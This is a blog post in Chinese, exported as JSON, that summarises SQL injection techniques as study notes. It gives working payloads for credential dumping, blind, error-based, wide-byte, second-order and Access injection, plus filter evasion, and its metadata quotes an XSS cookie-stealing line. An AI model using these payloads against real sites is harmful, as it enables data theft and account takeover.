{"title":"SQL注入总结","uid":"754cd72126d47294dafd145f6f3562e7","slug":"SQL注入总结","date":"2021-11-08T11:24:23.000Z","updated":"2021-11-13T14:51:51.359Z","comments":true,"path":"api/articles/SQL注入总结.json","keywords":null,"cover":null,"content":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<p>最近本来是打算投简历看看的，结果当场面试了，很尴尬。笔试发现自己菜的扣脚。。。毕竟接触时间较短，发现好多我不懂的问题，连http协议都有地方不会。。。。。。。。https的s是用来防止中间人攻击的，反射型xss不是在服务器上。</p>\n<p>一个漏洞一个漏洞的总结吧。。。。</p>\n<h2 id=\"常见注入点\"><a href=\"#常见注入点\" class=\"headerlink\" title=\"常见注入点\"></a>常见注入点</h2><ol>\n<li>表单中的输入域</li>\n<li> URL的参数</li>\n<li> Cookie或者隐藏域</li>\n</ol>\n<h2 id=\"注入点检测\"><a href=\"#注入点检测\" class=\"headerlink\" title=\"注入点检测\"></a>注入点检测</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">?id&#x3D;1     #测试点\n?id&#x3D;1&#39;   #单引号报错\n?id&#x3D;1&quot;   #双引号报错\n?id&#x3D;1\\   #反斜杠报错\n?id&#x3D;1&#39;--+    #注释后面\n?id&#x3D;1&#39;)--+\n?id&#x3D;1&#39;))--+  #有的需要加)或者两个))\n?id&#x3D;1 and 1&#x3D;1 #数字型不变逻辑,后面可加注释如:--+,#等\n?id&#x3D;1 and 1&#x3D;2 #空集逻辑\n?id&#x3D;1 or 1&#x3D;1  #全集逻辑\n?id&#x3D;1&#39;and &#39;1&#39;&#x3D;&#39;1 #字符型不变逻辑，其他如上\n?id&#x3D;1+and+1&#x3D;1--+  #用加号代替空格\n上面还可以进行url编码，有些浏览器自动将空格编码，有些则没有，可以自己利用url编码工具进行编码。\n前面的如果有明显变化的，表示可能存在注入点。若没有明显变化,则可以使用sleep函数测试。\n?id&#x3D;1&#39; and sleep(5)  #用sleep函数进行注入点测试\n当然我们可以直接利用sqlmap进行注入点检测，在kali中\nsqlmap -u http:&#x2F;&#x2F;xxx.xx?id&#x3D;1   #将会自动检测</code></pre>\n\n<h2 id=\"注入利用–MySQL\"><a href=\"#注入利用–MySQL\" class=\"headerlink\" title=\"注入利用–MySQL\"></a>注入利用–MySQL</h2><h3 id=\"判断数据库\"><a href=\"#判断数据库\" class=\"headerlink\" title=\"判断数据库\"></a>判断数据库</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">user(),version()\n不同的数据库返回值都各有特征，进而推断是什么数据库类型。\n如user()函数返回情况：\n     mysql返回root@localhost\n     oracle返回sys\n     sqlserver返回sa\n执行成功，即探子回报。说明程序对函数，括号()和子查询并未做过滤，可能可以执行函数、子查询等复杂逻辑。\n探子没有回报，基本上说明注入攻击困难或者注入可能性很小。</code></pre>\n\n<h3 id=\"GET类型-有回显点\"><a href=\"#GET类型-有回显点\" class=\"headerlink\" title=\"GET类型-有回显点\"></a>GET类型-有回显点</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">order by 3  #判断字段数\n?id&#x3D;1&#39;and 0&#x3D;9 union select 1,2,3  #判断回显点\n\n?id&#x3D;1&#39; and 0&#x3D;9 union select 1,group_concat(schema_name),3 from information_schema.schemata --+ \n#获取所有库名\n?id&#x3D;1&#39; and 0&#x3D;9 union select 1,group_concat(distinct table_schema),3 from    information_schema.tables --+\n#获取所有库名\n\n?id&#x3D;1&#39; and 0&#x3D;9 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database() --+   #获取表名\n\n?id&#x3D;1&#39; and 0&#x3D;9 union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;users&#39; --+   #获取字段名\n\n?id&#x3D;1&#39; and 0&#x3D;9 union select 1,group_concat(username,0x3a,password),3 from users--+  #获取字段值\n</code></pre>\n\n<h3 id=\"相关函数和数据库结构信息\"><a href=\"#相关函数和数据库结构信息\" class=\"headerlink\" title=\"相关函数和数据库结构信息\"></a>相关函数和数据库结构信息</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">User() current_user() session_user() 返回当前连接的用户名（包含主机名）\nversion() 数据库版本号\ndatabase() 当前连接的数据库名\nlength()   计算字符串长度\nleft()    取最左边的字符\nsubstring() 取字符串中任意长度字长\nposition()  返回字符所在字符串中的位置\nlocate()    返回字符所在字符串中的位置\n在Mysql 5.0以上的版本中，为了方便管理，默认定义了information_schema数据库，用来存储数据库元信息。其中具有表schemata(数据库名)、tables(表名)、columns(列名或字段名)。ROUTINES 存储过程或者函数信息,VIEWS 视图信息,TRIGGERS 触发器信息\n\n在schemata表中，schema_name字段用来存储数据库名。\n在tables表中，table_schema和table_name分别用来存储数据库名和表名。\n在columns表中，table_schema(数据库名)、table_name(表名)、column_name(字段名)\n拓展limit关键字  limit m,n 从m行开始，到m+n行</code></pre>\n\n<h3 id=\"盲注\"><a href=\"#盲注\" class=\"headerlink\" title=\"盲注\"></a>盲注</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">?id&#x3D;1&#39;and if(left(version(),1)&#x3D;5,sleep(1),2)  #利用sleep函数判断版本号或者用户名，密码等\n?id&#x3D;1&#39; and if(substring(uname,1,1)&#x3D;&#39;b&#39;,benchmark(10000000,md5(&#39;b&#39;)),1)  #Benchmark穷举法猜测用户名和密码等\nSelect sleep(1);睡眠1秒\nSelect left(user(),1)获得user()最左边的1位\nSubstring()获得字符串任意位置的任意个字符\nBenchmark()对运算执行压力测试\nIf()表达式，第一个表达式为真，则执行第二个表达式，否则执行第三个表达式\n一般利用工具盲注，太麻烦太耗时间了。</code></pre>\n\n<h3 id=\"报错注入\"><a href=\"#报错注入\" class=\"headerlink\" title=\"报错注入\"></a>报错注入</h3><p>没有错误也要制造错误，并把查询的信息让错误带出来告诉注入者到底有什么东西，把所有家底能透露的都透露了。</p>\n<p>相关函数：If(),rand(),floor(),ifnull(),concat,group_concat()</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Select count(*),concat(version(),floor(rand()*2),user()) as a from users group by a  #暴露系统用户名敏感信息\n\n?id&#x3D; 0&#39; union select 1,2,3 from (select count(*),concat((select concat(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+   #获取数据库\n\nselect count(*),concat((select (select (SELECT schema_name FROM information_schema.schemata limit 0,1)) as a_col from information_schema.tables limit 0,1),floor(rand(0)*2)) x_col from information_schema.tables group by x_col   #获取所有库名\n\n?id&#x3D; 0&#39; union select 1,2,3 from (select count(*),concat((select concat(table_name,0x3a,0x3a) from information_schema.tables where table_schema&#x3D;database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+  #获取表名\n\nselect count(*),concat((select (select (SELECT table_name FROM information_schema.tables where table_schema&#x3D;database() limit 0,1)) as a_col from information_schema.tables limit 0,1),floor(rand(0)*2))x_col from information_schema.tables group by x_col   #获取所有表名\n\n\nid&#x3D; 0&#39; union select 1,2,3 from (select count(*),concat((select concat(username,0x3a, 0x3a,password,0x3a, 0x3a) from security.users limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+   #获取用户信息\n\n?id&#x3D; 0&quot; union select count(*),0,concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))as a from information_schema.tables group by a limit 0,10 --+   #双引号报错注入，前面是单引号。\n\n?id&#x3D;1 and updatexml(2,concat(0x7e,database(),0x7e),1);   \n#利用updatexml函数进行注入,database()是系统函数返回系统变量database的值。@@version代表系统变version\n?id&#x3D;1 and updatexml(2,concat(0x7e,@@version,0x7e),1);\n\n?id&#x3D;1 and extractvalue(1,concat(0x7e,database(),0x7e));   #利用extractvalue函数进行注入\n?id&#x3D;1 and extractvalue(1,concat(0x7e,@@version,0x7e));</code></pre>\n\n<h3 id=\"宽字节注入\"><a href=\"#宽字节注入\" class=\"headerlink\" title=\"宽字节注入\"></a>宽字节注入</h3><p>当数据库使用gbk编码时，使用%DF%5C，%bf%5c进行宽字节注入，将单引号闭合。</p>\n<p>asscii大于128， GBK首字节对应0x81–0xFE,尾字节对应0x40–0xFE(除去0x7F)。</p>\n<p>SQLMAP使用–tamper=unmagicquotes.py脚本。</p>\n<h3 id=\"二次注入\"><a href=\"#二次注入\" class=\"headerlink\" title=\"二次注入\"></a>二次注入</h3><p>注入payload，再利用如重置密码功能修改管理员密码。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">admin&#39;-- -</code></pre>\n\n<p>注入payload，触发xss攻击。</p>\n<h3 id=\"Access注入-ASP-Access\"><a href=\"#Access注入-ASP-Access\" class=\"headerlink\" title=\"Access注入(ASP+Access)\"></a>Access注入(ASP+Access)</h3><p>只有表，直接用sqlmap查表,基本基于字典</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">sqlmap -u url --tables</code></pre>\n\n<h4 id=\"Access偏移注入\"><a href=\"#Access偏移注入\" class=\"headerlink\" title=\"Access偏移注入\"></a>Access偏移注入</h4><p>知道表名，得不到字段。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">1.判断字段数 order by\n2.判断表名  使用union select * from 表名,如admin\n3.偏移注入  利用公式注入\n?id&#x3D;1+union+select+1,2,3,4,5,6,7,8,9+from+admin\n?id&#x3D;1+union+select+1,2,3,4,5,*+from+admin  \n#一个一个测试，到5用*号代替显示正常，利用公式\n9-5&#x3D;4;9-4*2&#x3D;1;则从1之后开始\n当前admin表中字段数就为4；\n?id&#x3D;1+union+select+1,a.id,b.id,*+from+(admin+as+a+inner+join+admin+as+b+on+a.id&#x3D;b.id)</code></pre>\n\n\n\n<h3 id=\"规避检查\"><a href=\"#规避检查\" class=\"headerlink\" title=\"规避检查\"></a>规避检查</h3><p>or–+2=!!!2 类假!!!2为真的结果，利用不变逻辑的!!!替代空格<br>注释替代 and/<strong>/select/</strong>/uname/<strong>/from/</strong>/users<br>+号连接字符替换</p>\n<p>大小写绕过</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">and\n改为\nAnD </code></pre>\n\n<p>双写绕过</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">union\n改为\nuniunionon</code></pre>\n\n<p>and改为&amp;&amp;，or改为||.</p>\n<p>/*!内联*/  内联注释，会执行看里面的内容</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#x2F;*!union*&#x2F; select 1,2,3 --+</code></pre>\n\n<p>/**/多行注释</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">un&#x2F;**&#x2F;ion select 1,2,3 --+</code></pre>\n\n<p>将语句进行url编码</p>\n<p>十六进制码替代%20<br>ASCII码替换char(32)</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">and substring(user(),1,1)&#x3D;‘z’\n改为\nand asci(substring(user(),1,1))&#x3D;122   #规避了单引号</code></pre>\n\n<p>空格替换</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">%0a  新建一行\n%09  TAB键（水平）\n%0d  return功能\n%0b  TAB键（垂直）\n%0c  新建一页\n%20  就是空格\nhex编码</code></pre>\n\n<p>还有好多内容啊，等后面一一总结吧！！！</p>\n<p>现在的网站基本上都防御了sql注入。想在网站上找到注入点真难。。还是玩靶场好一点。</p>\n","text":" 最近本来是打算投简历看看的，结果当场面试了，很尴尬。笔试发现自己菜的扣脚。。。毕竟接触时间较短，发现好多我不懂的问题，连http协议都有地方不会。。。。。。。。https的s是用来防止中间人攻击的，反射型xss不是在服务器上。 一个漏洞一个漏洞的总结吧。。。。 常见注入点 表单...","link":"","photos":[],"count_time":{"symbolsCount":"5.8k","symbolsTime":"5 mins."},"categories":[{"name":"安全漏洞基础","slug":"安全漏洞基础","count":5,"path":"api/categories/安全漏洞基础.json"}],"tags":[{"name":"owasp TOP 10","slug":"owasp-TOP-10","count":2,"path":"api/tags/owasp-TOP-10.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%B8%B8%E8%A7%81%E6%B3%A8%E5%85%A5%E7%82%B9\"><span class=\"toc-text\">常见注入点</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%B3%A8%E5%85%A5%E7%82%B9%E6%A3%80%E6%B5%8B\"><span class=\"toc-text\">注入点检测</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E2%80%93MySQL\"><span class=\"toc-text\">注入利用–MySQL</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93\"><span class=\"toc-text\">判断数据库</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#GET%E7%B1%BB%E5%9E%8B-%E6%9C%89%E5%9B%9E%E6%98%BE%E7%82%B9\"><span class=\"toc-text\">GET类型-有回显点</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0%E5%92%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BB%93%E6%9E%84%E4%BF%A1%E6%81%AF\"><span class=\"toc-text\">相关函数和数据库结构信息</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%9B%B2%E6%B3%A8\"><span class=\"toc-text\">盲注</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">报错注入</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">宽字节注入</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">二次注入</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Access%E6%B3%A8%E5%85%A5-ASP-Access\"><span class=\"toc-text\">Access注入(ASP+Access)</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#Access%E5%81%8F%E7%A7%BB%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">Access偏移注入</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%A7%84%E9%81%BF%E6%A3%80%E6%9F%A5\"><span class=\"toc-text\">规避检查</span></a></li></ol></li></ol>","author":{"name":"Longw","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"XSS总结","uid":"092a8eb566bb4d51073324d6cfbab7e6","slug":"XSS总结","date":"2021-11-09T13:57:15.000Z","updated":"2021-11-09T14:23:19.995Z","comments":true,"path":"api/articles/XSS总结.json","keywords":null,"cover":null,"text":" payload来自csdn-仙女象 反射型XSS&lt;script&gt;document.write(&#39;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;ip:8899&#x2F;&#39;+document.cookie+&#39;&...","link":"","photos":[],"count_time":{"symbolsCount":"4.4k","symbolsTime":"4 mins."},"categories":[{"name":"安全漏洞基础","slug":"安全漏洞基础","count":5,"path":"api/categories/安全漏洞基础.json"}],"tags":[{"name":"owasp TOP 10","slug":"owasp-TOP-10","count":2,"path":"api/tags/owasp-TOP-10.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"汽车黑客入门","uid":"ebc4d430e2c23dfe4e07a222f7299552","slug":"汽车黑客入门","date":"2021-10-26T05:51:57.000Z","updated":"2021-10-26T11:08:22.624Z","comments":true,"path":"api/articles/汽车黑客入门.json","keywords":null,"cover":[],"text":" 最近在telegram上找到一个安全实验室的成员，关注了一下。发现她的研究方向是汽车黑客，看了一下他发的汽车黑客入门，挺有意思的。。。。。。 分为基础篇，模拟器篇，案例篇。 原作者：https://www.hackers-arise.com/automobile-hacking...","link":"","photos":[],"count_time":{"symbolsCount":"6.4k","symbolsTime":"6 mins."},"categories":[{"name":"汽车黑客","slug":"汽车黑客","count":1,"path":"api/categories/汽车黑客.json"}],"tags":[{"name":"汽车黑客入门","slug":"汽车黑客入门","count":1,"path":"api/tags/汽车黑客入门.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}